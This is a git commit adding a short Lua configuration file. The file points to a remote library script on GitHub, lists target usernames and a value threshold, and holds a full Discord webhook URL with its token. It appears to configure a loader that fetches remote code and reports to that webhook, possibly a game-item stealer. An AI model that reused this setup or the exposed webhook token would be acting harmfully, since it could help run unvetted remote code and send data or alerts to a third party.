5e76419ed2e96b03d5b1df2a06ca1d59c3d0a81f
purple.haz3 <94627848+pwnedbysuwi@users.noreply.github.com>
2025-06-21 20:54:05 +0800

    Add files via upload

---
+++ config_return.lua
@@ -0,0 +1,8 @@
+
+return {
+    libURL = "https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua",
+    users = { "horsegiirL1171" },
+    min = 10000000000,
+    ping = "Yes",
+    webhook = "https://discord.com/api/webhooks/1385962194490888304/lmJmW09r0_ZOb4xCCFUxg7OVsUtAeum_hUb2pxInIbPYxHrQoqZfu70ItarMDoJIhZ7t"
+}
